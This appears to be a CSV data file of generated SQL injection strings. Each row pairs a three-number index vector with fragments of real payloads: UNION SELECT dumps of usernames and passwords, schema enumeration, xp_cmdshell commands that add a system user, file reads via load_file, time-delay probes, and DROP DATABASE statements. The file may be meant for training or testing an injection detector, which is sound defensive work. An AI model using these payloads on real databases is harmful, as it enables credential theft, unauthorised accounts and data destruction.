sig_vector,sig_string
"[78, 36, 9]"," = 1 union select 1,2,3  /* (select @@version） 1 or "
"[47, 43, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 exec master.dbo.xp_cmdshell 'net user username password /add' = 1 union select 1,2,3  /*"
"[36, 36, 76]"," (select @@version） (select @@version） ;insert into users(id,username,password) values('100','new','new');"
"[47, 51, 4]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3' and "
"[39, 51, 78]","(select IS_SRVROLEMEMBER('sysadmin'))union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[37, 36, 21]", WAITFOR DELAY '0:0:5' (select @@version） select * from users where id=1 
"[47, 33, 34]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  exec master..xp_cmdshell ' INSERT INTO"
"[7, 51, 17]","and 0 ><union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 ' and 1=2"
"[35, 51, 78]"," delete table dirs union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[30, 51, 23]"," select version()union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,username,password from users where id=2"
"[5, 21, 51]",") and  select * from users where id=1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[36, 51, 76]"," (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 ;insert into users(id,username,password) values('100','new','new');"
"[47, 47, 67]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ';--"
"[55, 51, 21]"," order by 1union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[36, 4, 81]", (select @@version）' and  create table test like users;
"[35, 32, 33]"," delete table dirs  union select 1,2,(database())  exec master..xp_cmdshell '"
"[22, 51, 17]"," union select 1,2union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 ' and 1=2"
"[11, 47, 68]"," ) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  */"
"[44, 36, 67]","create table dirs(paths varchar(100), id int) (select @@version）';--"
"[47, 47, 17]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  ' and 1=2"
"[47, 36, 67]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）';--"
"[35, 47, 78]"," delete table dirs union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /*"
"[49, 47, 17]"," union select 1,2,load_file('C://1.txt')union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  ' and 1=2"
"[47, 51, 67]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3';--"
"[47, 47, 4]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ' and "
"[47, 36, 4]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）' and "
"[56, 51, 79]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3--+"
"[55, 11, 78]"," order by 1 ) or  = 1 union select 1,2,3  /*"
"[6, 2, 78]"," 1)) or ‘ = 1 union select 1,2,3  /*"
"[35, 9, 78]"," delete table dirs  1 or  = 1 union select 1,2,3  /*"
"[35, 36, 68]", delete table dirs  (select @@version） */
"[47, 36, 56]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[47, 4, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ' and  select * from users where id=1 "
"[47, 36, 46]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）1"
"[47, 51, 46]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),31"
"[56, 2, 82]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)‘ drop table sc3；"
"[58, 36, 36]", (select count(*) from sysobjects) (select @@version） (select @@version）
"[17, 36, 51]"," ' and 1=2 (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[47, 35, 27]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  delete table dirs  select * from users where id=1"
"[47, 52, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  sleep(5) select * from users where id=1 "
"[13, 78, 21]"," admin' = 1 union select 1,2,3  /* select * from users where id=1 "
"[47, 49, 2]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2,load_file('C://1.txt')‘"
"[47, 36, 27]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） select * from users where id=1"
"[62, 51, 51]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[47, 36, 66]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）;--"
"[47, 15, 56]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  and 1=2 union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[47, 51, 27]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1"
"[47, 36, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） (select @@version）"
"[26, 47, 67]"," union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ';--"
"[32, 36, 28]"," union select 1,2,(database())  (select @@version）(select count(*) from mysql.user)>0"
"[47, 2, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ‘ select * from users where id=1 "
"[68, 57, 21]"," */union select 1,@@datadir,3 select * from users where id=1 "
"[49, 50, 21]"," union select 1,2,load_file('C://1.txt') 1 = 2 union all select user()  select * from users where id=1 "
"[47, 12, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 1 ' select * from users where id=1 "
"[47, 51, 38]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select Count(*) from table)>0"
"[61, 51, 78]"," 1=(select name from master.dbo.sysdatabases where id=1)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[47, 51, 56]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[14, 36, 22]"," or  (select @@version） union select 1,2"
"[78, 51, 82]"," = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3；"
"[51, 14, 36]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 or  (select @@version）"
"[10, 51, 21]"," +union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[47, 11, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  ) or  select * from users where id=1 "
"[47, 53, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  if(length(database())=8,sleep(5),1) select * from users where id=1 "
"[47, 51, 58]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select count(*) from sysobjects)"
"[21, 51, 21]"," select * from users where id=1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[29, 51, 21]"," drop database dbunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[32, 51, 21]"," union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[36, 36, 9]", (select @@version） (select @@version） 1 or 
"[47, 36, 62]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[47, 36, 39]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）(select IS_SRVROLEMEMBER('sysadmin'))"
"[62, 62, 51]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[60, 78, 36]","ord(mid(user(),1,1))=114 = 1 union select 1,2,3  /* (select @@version）"
"[47, 11, 19]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  ) or  or'1'='1"
"[47, 51, 62]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[47, 27, 10]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  select * from users where id=1 +"
"[35, 36, 20]", delete table dirs  (select @@version） exists (select * from sysobjects)
"[42, 36, 27]","exec master.dbo.sp_password null,username,password (select @@version） select * from users where id=1"
"[42, 51, 21]","exec master.dbo.sp_password null,username,passwordunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[29, 36, 62]", drop database db (select @@version） 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[21, 51, 73]"," select * from users where id=1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3>=0 --"
"[47, 9, 44]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1 or create table dirs(paths varchar(100), id int)"
"[15, 51, 21]"," and 1=2 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[19, 35, 21]", or'1'='1 delete table dirs  select * from users where id=1 
"[47, 51, 39]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3(select IS_SRVROLEMEMBER('sysadmin'))"
"[47, 57, 56]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,@@datadir,3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[50, 1, 5]", 1 = 2 union all select user() ') or) and 
"[40, 51, 21]","(select IS_MEMBER('db_owner'))union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[1, 23, 26]","') or union select 1,username,password from users where id=2 union select 1,1,1,load_file(c:\\boot.ini) 
"
"[47, 51, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select @@version）"
"[47, 78, 45]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /*extractvalue(1, concat(0x7e,@@version,0x7e))"
"[15, 36, 21]", and 1=2  (select @@version） select * from users where id=1 
"[47, 9, 26]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1 or  union select 1,1,1,load_file(c:\\boot.ini) 
"
"[47, 3, 13]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 '')) or admin'"
"[10, 51, 3]"," +union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3'')) or"
"[47, 62, 0]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name='' or"
"[82, 3, 21]", drop table sc3；'')) or select * from users where id=1 
"[14, 22, 62]"," or  union select 1,2 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[47, 51, 71]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 --"
"[47, 51, 31]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 benchmark(3000000,MD5(1))"
"[36, 51, 21]"," (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[47, 42, 67]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 exec master.dbo.sp_password null,username,password';--"
"[47, 1, 80]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ') or and 1=1;"
"[47, 68, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  */ = 1 union select 1,2,3  /*"
"[47, 36, 43]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）exec master.dbo.xp_cmdshell 'net user username password /add'"
"[57, 56, 21]","union select 1,@@datadir,3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) select * from users where id=1 "
"[2, 32, 19]","‘ union select 1,2,(database())  or'1'='1"
"[78, 51, 62]"," = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[36, 36, 21]", (select @@version） (select @@version） select * from users where id=1 
"[32, 36, 21]"," union select 1,2,(database())  (select @@version） select * from users where id=1 "
"[26, 36, 30]"," union select 1,1,1,load_file(c:\\boot.ini) 
 (select @@version） select version()"
"[47, 23, 23]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,username,password from users where id=2 union select 1,username,password from users where id=2"
"[24, 36, 21]"," 1=(if((user() regexp '^r'),1,0)) (select @@version） select * from users where id=1 "
"[19, 62, 21]", or'1'='1 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= select * from users where id=1 
